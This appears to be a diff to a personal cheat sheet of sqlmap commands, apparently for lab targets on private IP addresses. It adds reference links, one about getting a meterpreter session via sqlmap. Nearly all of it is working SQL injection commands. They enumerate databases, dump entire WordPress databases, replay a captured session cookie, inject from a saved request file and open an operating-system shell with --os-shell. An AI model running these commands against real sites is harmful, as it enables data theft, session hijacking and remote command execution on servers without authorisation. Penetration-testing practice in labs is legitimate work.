@@ -1,3 +1,7 @@
+https://github.com/sqlmapproject/sqlmap/wiki/Usage
+https://hackertarget.com/sqlmap-post-request-injection/
+https://secnhack.in/take-meterpreter-of-website-using-sqlmap-os-shell/
+
 1
     sqlmap -u "http://192.168.80.162/_PATH_/?cat=1" --dbms=MySQL --dbs
     sqlmap -u "http://192.168.80.162/_PATH_/?cat=1" --dbms=MySQL -D wordpress --tables 
@@ -14,3 +18,12 @@
 4
     sqlmap –u http://192.168.1.104/_PATH_/?cat=1 --dbs --batch
     sqlmap –u http://192.168.1.104/_PATH_/?cat=1 -D wordpress --dump-all --batch
+
+
+document.cookie
+sqlmap --cookie="security=low; PHPSESSID=oikbs8qcic2omf5gnd09kihsm7" -u "http://192.168.80.162/_PATH_/?cat=1" --dbms=MySQL --dbs
+
+./sqlmap.py -r search-test.txt -p id
+(--force-ssl)
+
+sqlmap -r secnhack --os-shell
